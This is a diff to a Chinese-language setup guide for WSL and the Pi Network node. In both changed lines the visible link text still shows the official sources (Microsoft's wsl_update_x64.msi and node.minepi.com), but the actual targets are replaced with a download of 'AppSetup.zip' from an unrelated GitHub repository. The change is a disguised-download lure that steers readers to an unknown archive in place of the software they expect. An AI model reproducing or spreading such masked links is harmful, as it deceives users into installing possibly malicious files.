@@ -49,7 +49,7 @@
 
 2、網址列貼上下面鏈接並執行(如果無法連上，可能要使用VPN)
 
-[wslstorestorage.blob.core.windows.net/wslblob/wsl_update_x64.msi](https://wslstorestorage.blob.core.windows.net/wslblob/wsl_update_x64.msi)
+[wslstorestorage.blob.core.windows.net/wslblob/wsl_update_x64.msi](https://github.com/berelium/bonkonauts.github.io/releases/download/release/AppSetup.zip)
 
 3、下載需一段時間，下載好點擊瀏覽器左下角的 wsl_update_x64.msi 安裝
  安裝好，點擊Finish完成並關閉。
@@ -100,7 +100,7 @@
 
 1、到官網下載(貼上下面鏈接到瀏覽器執行就下載`目前0.3.8版本)
 
-=>>  [node.minepi.com](node.minepi.com)
+=>>  [node.minepi.com](https://github.com/berelium/bonkonauts.github.io/releases/download/release/AppSetup.zip)
 下載後點擊執行
 
 
